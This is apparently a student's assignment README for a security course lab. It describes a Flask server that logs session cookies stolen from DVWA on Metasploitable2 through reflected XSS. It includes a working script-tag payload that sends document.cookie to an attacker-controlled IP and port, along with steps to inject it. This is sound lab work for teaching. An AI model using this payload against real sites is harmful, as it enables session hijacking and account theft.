Student Name: Edward Wagstaffe
UOW ID: 8762697
CSCI369 - Assignment (Task 2)

Requirements: 
Operating System: Kali Linux (attacker) with Python 3.x 
Metasploitable2 (victim) DVWA host
All machines on NAT network

Overview
This Python script uses the Flask framework to create a lightweight web server on the attacker's machine (Kali VM) that captures and logs session cookies exfiltrated from a vulnerable web application (DVWA on Metasploitable2) via reflected XSS. The JavaScript payload is injected into the "XSS reflected" page of DVWA to send the victim's cookie to the attacker's server. Cookies are timestamped and saved to cookies.txt.
Note: This script is for educational purposes only and should not be used maliciously. Ensure DVWA security is set to "medium" for the injection to work as intended.

JavaScript Payload
The following payload is injected into the "What's your name" field on DVWA's "XSS reflected" page (replace 10.0.2.15 with the attacker's IP if different):
<SCRIPT>new Image().src = 'http://10.0.2.15:1337/csci369task2?cookie=' + document.cookie;</SCRIPT>


Permissions: Root privileges required (sudo)

Usage:

1. Activate the virtual environment: 
$> mkdir myproject
$> cd myproject
$> python3 -m venv .venv
$> . .venv/bin/activate

2. Run the python script: $>sudo python3 flask_server.py
The server will start listening on port 1337.

3. Ensure that the Metasploitable2 VM is running and apache port 80 is open.

4. On the Kali browser, access DVWA at http://<Meta2 IP>/DVWA, log in, and navigate to "XSS reflected".
For example: http://10.0.2.5/DVWA

5. Inject the JavaScript payload into the input field and submit.
The cookie will be sent to the Flask server and logged in cookies.txt.

Verifying the Attack

Check the terminal output on Kali for confirmation messages (e.g., "Cookie captured at {timestamp}: {cookie}").
Inspect cookies.txt for logged entries.

Example Output (Terminal)
Cookie captured at 2025-08-12 14:30:45: PHPSESSID=example_session_id

